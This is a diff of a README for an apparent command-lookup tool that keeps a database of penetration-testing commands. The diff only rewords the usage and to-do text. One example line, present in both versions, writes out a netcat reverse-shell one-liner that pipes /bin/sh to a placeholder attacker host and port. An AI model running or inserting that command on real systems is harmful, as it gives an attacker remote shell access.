@@ -9,11 +9,11 @@ My current usage of this is to have it running in a tmux pane and when I need th
 - up/down arrow keys to highlight a command from the current search or from the history. Pressing return copies that command to the clipboard.  
 - 'info' displays full information on the currently selected command.  'full information' is very sparse at the moment.  
 - 'add -c <command>' to add a new command to the database.  optional: -d to add a comment/description with the command.
-- 'update <column> <content>' to update a database column of the currently selected command, which are 'command', 'comment' and 'author' at the moment. The ID of the active command is displayed in the command prompt. Examples: 'update comment spawn a pty via python3', 'update author greg scharf', 'update command rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [LHOST] [LPORT] >/tmp/f'.  
+- 'update <column> <content>' to update a database column in the currently selected command.  At the moment the only columns to update are 'command', 'comment' and 'author'. Examples: 'update comment spawn a pty via python3', 'update author greg scharf', 'update command rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [LHOST] [LPORT] >/tmp/f'.  
 
 ## Currently Working On
 - 'set' command for variable replacement when selecting a command that has placeholders for LHOST, LPORT, etc.
-- In 'info' show variables that need to be set and their value if they are set.
+- In 'info' show variables that need to be set and if they are set display their current value.
 - Need to do some sed magic on the database build files to make variable names consistent and then rebuild the database.
 
 ## To Add
